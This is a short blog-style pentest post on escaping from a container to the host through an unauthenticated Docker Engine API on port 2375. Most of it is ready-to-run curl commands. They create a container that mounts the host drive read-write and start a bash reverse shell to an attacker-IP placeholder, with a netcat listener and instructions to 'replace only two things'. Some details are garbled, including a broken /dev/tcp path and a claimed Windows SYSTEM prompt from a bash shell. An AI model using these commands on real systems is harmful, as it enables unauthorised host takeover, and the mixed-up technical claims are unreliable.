---
title: System Takeover
published: 2025-06-22
description: ⭐ NANO IS HERE ⭐
tags: [DockerEscape, PrivilegeEscalation, WindowsAdmin, Exploitation ,]
image: "./Docker.png"
category: TTPS
draft: false
---

> Cover image source: [Source](./Docker.png)

 Introduction
---------------
Instant Root via Unauthenticated Docker Engine API (TCP/2375)From Low-Priv Container → Full ROOT Priv
=====================================================================================================
⭐ NANO IS HERE ⭐


**Today i explain and how to get root from www-data inside a container → NT AUTHORITY\SYSTEM on the Windows host : Unauthenticated Docker API (TCP/2375) — the silent domain killer that still ends every pentest I do.**

Coffee ready? 🤧 Let’s go.

1. Container → Host Discovery
------------------------------

```
cat /etc/resolv.conf → nameserver 127.0.0.11
```

2. Unauthenticated Docker API Confirmed
----------------------------------------

Try Docker API

```
curl <http://TARGET_HOST_IP:2375/version>  
```

Full JSON response → Docker API completely unauthenticated.

3. Privilege Escalation → Full NT AUTHORITY\SYSTEM (the exact commands we ran)
--------------------------------------------------------------------------------

**Step 1 — Inside the www-data shell**

```
IMG=$(curl -s http://TARGET_HOST_IP:2375/images/json | jq -r '.[0].RepoTags[0]')
curl -X POST -H "Content-Type: application/json" http://TARGET_HOST_IP:2375/containers/create?name=nano -d '{
  "Image": "'"$IMG"'",
  "Cmd": ["cmd.exe"],
  "HostConfig": {"Binds": ["/mnt/host/c:/host:rw"]},
  "OpenStdin": true,
  "Tty": true
}'
curl -X POST http://TARGET_host_IP:2375/containers/nano/start
``````
```
nc -lvnp 4444
```

**Step 3 — (one curl = SYSTEM) U WILL GET ROOT JUST ENTER THIS COMMEND BElow**

```
curl -X POST -H "Content-Type: application/json" <http://TARGET_HOST_IP:2375/containers/create?name=nano> -d '{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["bash","-c","bash -i >& /dev/tcp/UR_IP_ATTACKER_Machine /4444 0>&1"],
  "HostConfig": {"Binds": ["/mnt/host/c:/host:rw"]}
}' && curl -X POST <http://TARGET_HOST_IP:2375/containers/nano/start>
```
**Replace only two things:**

*   HOST_IP → your target host IP
*   ATTACKER_IP → your IP

AND_AFTER THAT U WILL GET ROOT ON VICTIM
```
C:\\Windows\\Windows\\system32>
```
![captionless image](https://miro.medium.com/v2/resize:fit:996/format:webp/1*CT79n7HQfx7HDA30k330SA.gif)
